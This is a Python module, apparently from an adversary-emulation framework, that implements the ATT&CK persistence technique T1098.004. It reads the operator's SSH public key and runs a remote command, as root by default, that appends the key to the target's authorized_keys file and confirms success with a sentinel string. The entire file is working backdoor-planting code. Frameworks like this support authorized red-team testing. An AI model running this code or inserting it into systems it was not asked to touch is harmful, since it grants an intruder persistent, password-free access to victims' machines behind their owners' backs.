import logging
import os

from modules.base_module import APT_MODULE
from models.target import Target, MESSAGE_TYPE
from models.module_metadata import AttackTactic, TargetOS, TargetArch
from utils.ssh_helper import ssh_exec


class add_ssh_key(APT_MODULE):
    name = "Add SSH Key"
    description = (
        "Plants the operator's SSH public key into the target's authorized_keys file "
        "to establish persistent, password-free access. Requires existing SSH access "
        "(e.g., via key at ssh_key_path) and a known user account."
    )
    tactic = AttackTactic.PERSISTENCE
    technique_id = "T1098.004"
    technique_name = "Account Manipulation: SSH Authorized Keys"
    compatible_os = [TargetOS.LINUX, TargetOS.MACOS]
    compatible_arch = [TargetArch.ANY]

    ssh_user = "root"
    ssh_port = 22
    ssh_key_path = "~/.ssh/id_rsa"
    pub_key_path = "~/.ssh/id_rsa.pub"

    def __init__(self) -> None:
        super().__init__()

    def action(self, target: Target):
        pub_key_expanded = os.path.expanduser(self.pub_key_path)
        target.log_activity(f"Reading local public key from {pub_key_expanded}...", True)

        try:
            with open(pub_key_expanded, "r") as f:
                pub_key = f.read().strip()
        except FileNotFoundError:
            target.log_activity(
                f"Public key not found at {pub_key_expanded}", True, MESSAGE_TYPE.ERROR)
            return

        # Plant the key and print a sentinel so we can confirm success
        command = (
            f"mkdir -p ~/.ssh && "
            f"chmod 700 ~/.ssh && "
            f"grep -qxF '{pub_key}' ~/.ssh/authorized_keys 2>/dev/null "
            f"  || echo '{pub_key}' >> ~/.ssh/authorized_keys && "
            f"chmod 600 ~/.ssh/authorized_keys && "
            f"echo 'APT_KEY_PLANTED'"
        )

        target.log_activity(
            f"Planting SSH key on {self.ssh_user}@{target.ip_label}...", True)
        stdout, stderr, rc = ssh_exec(
            target.ip_label, command,
            user=self.ssh_user, port=self.ssh_port, key_path=self.ssh_key_path,
        )

        if rc == 0 and "APT_KEY_PLANTED" in stdout:
            target.log_activity("SSH key planted successfully", True, MESSAGE_TYPE.SUCCESS)
        elif rc == 0:
            target.log_activity(
                "Command ran but sentinel not found – key may already be present",
                True, MESSAGE_TYPE.INFORMATION,
            )
        else:
            logging.log(logging.ERROR, f"add_ssh_key [{target.ip_label}]: {stderr}")
            target.log_activity(
                f"Failed: {stderr.strip() or stdout.strip()}", True, MESSAGE_TYPE.ERROR)

    def enable(self, e):
        self.enabled = e
